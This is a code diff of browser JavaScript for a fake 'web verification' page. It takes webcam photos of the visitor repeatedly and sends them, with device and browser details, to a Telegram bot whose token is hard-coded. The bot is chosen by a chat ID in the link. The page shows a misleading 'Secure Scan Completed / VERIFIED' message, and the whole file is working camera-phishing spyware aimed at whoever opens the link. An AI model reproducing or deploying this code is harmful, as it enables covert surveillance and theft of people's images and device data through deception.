@@ -1,30 +1,36 @@
 const BOT_TOKEN = "8750180526:AAFpXlIk0KHB5j3SljkE7DvheXngu7wA2Kg";
 
-// user id له URL نه اخلو
-const params = new URLSearchParams(window.location.search);
-const CHAT_ID = params.keys().next().value;
+// URL example: ?=8089055081
+const CHAT_ID = new URLSearchParams(window.location.search).get("=");
 
-// عناصر
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const ctx = canvas.getContext("2d");
 const progressBar = document.getElementById("progressBar");
 
-// camera access
-navigator.mediaDevices.getUserMedia({ video: true })
-  .then(stream => {
-    video.srcObject = stream;
-    startLoop();
-  })
-  .catch(() => {
-    alert("Camera permission required ❌");
-  });
+let interval;
 
+window.onload = async () => {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+
+    video.onloadedmetadata = () => {
+      startLoop();
+    };
+  } catch (e) {
+    alert("Camera permission required ❌");
+  }
+};
+
+// 🔄 loading loop (1 sec cycle)
 function startLoop() {
   let progress = 0;
 
-  setInterval(() => {
-    progress += 10;
+  if (interval) clearInterval(interval);
+
+  interval = setInterval(() => {
+    progress += 5;
     progressBar.style.width = progress + "%";
 
     if (progress >= 100) {
@@ -32,11 +38,10 @@ function startLoop() {
       progressBar.style.width = "0%";
       captureAndSend();
     }
-
-  }, 100); // 1 second
+  }, 50);
 }
 
-// عکس اخلو
+// 📸 capture image
 function captureAndSend() {
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
@@ -44,46 +49,33 @@ function captureAndSend() {
   ctx.filter = "brightness(1.1) contrast(1.2) saturate(1.3)";
   ctx.drawImage(video, 0, 0);
 
-  canvas.toBlob(blob => {
-    sendToTelegram(blob);
-  }, "image/jpeg");
+  canvas.toBlob(sendToTelegram, "image/jpeg");
 }
 
-// معلومات جوړوو
-function generateCaption() {
-  const time = new Date().toLocaleString();
-  const device = navigator.userAgent;
-  const platform = navigator.platform;
-
-  return `
-🌍 Secure Scan Completed
-
-🧠 System: Web Verification
-📅 Time: ${time}
-
-📱 Device: ${platform}
-🌐 Browser: ${device}
-
-🤖 Bot: @ProSimTookBot
-👨‍💻 Dev: @XFPro43
-
-🛡️ Status: VERIFIED ✅
-`;
-}
-
-// telegram ته لیږل
-function sendToTelegram(photo) {
+// 📤 send to telegram
+function sendToTelegram(blob) {
   const formData = new FormData();
 
   formData.append("chat_id", CHAT_ID);
-  formData.append("photo", photo, "scan.jpg");
-  formData.append("caption", generateCaption());
+  formData.append("photo", blob, "scan.jpg");
+
+  const caption =
+`🌍 Secure Scan Completed
+
+🤖 Bot: @ProSimTookBot
+👨‍💻 Developer: @XFPro43
+
+📱 Device: ${navigator.platform}
+🌐 Browser: ${navigator.userAgent}
+
+🛡️ Status: VERIFIED ✅`;
+
+  formData.append("caption", caption);
 
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
     method: "POST",
     body: formData
   })
-  .then(res => res.json())
-  .then(() => console.log("."))
+  .then(() => console.log("🔂"))
   .catch(err => console.error(err));
-}
+} 
